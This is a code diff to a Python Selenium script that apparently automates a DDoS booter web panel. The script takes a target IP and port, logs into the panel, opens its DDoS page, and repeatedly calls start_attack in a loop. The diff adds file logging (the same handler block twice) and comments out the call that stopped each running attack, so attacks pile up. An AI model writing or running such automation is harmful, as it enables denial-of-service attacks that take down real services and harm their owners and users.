@@ -4,6 +4,7 @@ from selenium.common.exceptions import *
 import time
 import traceback
 from rich.console import Console
+import logging
 
 from bot import Bot
 from config import Config
@@ -14,6 +15,10 @@ import utils.start
 
 
 config = Config()
+
+main_logger = logging.getLogger()
+main_logger.addHandler(logging.FileHandler(config.logs["main"]))
+main_logger.setLevel(logging.DEBUG)
 
 presets = Presets(driver_type=config.driver)
 service, options = presets.debug()
@@ -56,7 +61,11 @@ ip, port = get_user_input()
 
 
 
-bot = Bot(driver=driver, info=info)
+main_logger = logging.getLogger()
+main_logger.addHandler(logging.FileHandler(config.logs["main"]))
+main_logger.setLevel(logging.DEBUG)
+
+bot = Bot(driver=driver, info=info, main_logger=main_logger)
 bot.login_form()
 bot.DDoS_page()
 bot.close_button()
@@ -68,7 +77,7 @@ while True:
         bot.start_attack(ip, port, config.attack["time"], config.attack["method"])
         print(f"ejecución: {i}")
         time.sleep(config.attack["time"])
-        bot.stop_attack(bot.get_running_attacks(bot.get_cookies())["running"][0]["id"])
+        #bot.stop_attack(bot.get_running_attacks(bot.get_cookies())["running"][0]["id"])
     except Exception as e:
         traceback.print_exc()
     finally:
